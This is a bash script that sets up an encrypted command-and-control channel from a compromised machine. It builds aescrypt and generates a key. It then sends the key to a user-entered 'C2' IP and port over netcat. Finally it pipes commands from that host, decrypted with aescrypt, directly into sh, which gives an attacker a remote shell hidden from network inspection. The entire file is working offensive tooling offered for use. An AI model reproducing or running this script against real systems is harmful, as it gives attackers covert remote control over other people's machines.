#!/bin/bash

echo "[+] C2 IP? "
read rip
echo "[+] C2 PORT? "
read rport
echo "[+] Run the following command on the attack box: nc -lnvp $rport > .aes.key"
read -p "[+] Press enter to continue"
wget https://www.aescrypt.com/download/v3/linux/aescrypt-3.14.tgz
gunzip aescrypt-3.14.tgz
tar xf aescrypt-3.14.tar
cd aescrypt-3.14/src/
make
./aescrypt_keygen -g 64 .aes.key
sleep 5
echo "[+] Woohoo! If you can read this, your key has successfully been made!"
sleep 3
echo "[+] Copying the key to the attack box: nc $rip $rport < .aes.key"
sleep 3
echo "[+] After you see the connection has been made, press CTRL+C on the attack box"
nc $rip $rport < .aes.key
echo "[+] Setup the decrypting listener on the attack box: echo 'commands' | aescrypt -e -k .aes.key - | nc -lnvp $rport"
sleep 3
read -p "[+] Press enter to continue"
sleep 3
echo "[+] Connecting back to the C2 device! Press CTRL+C on the attack box once you see the connection has been made"
nc $rip $rport | ./aescrypt -d -k .aes.key - | sh
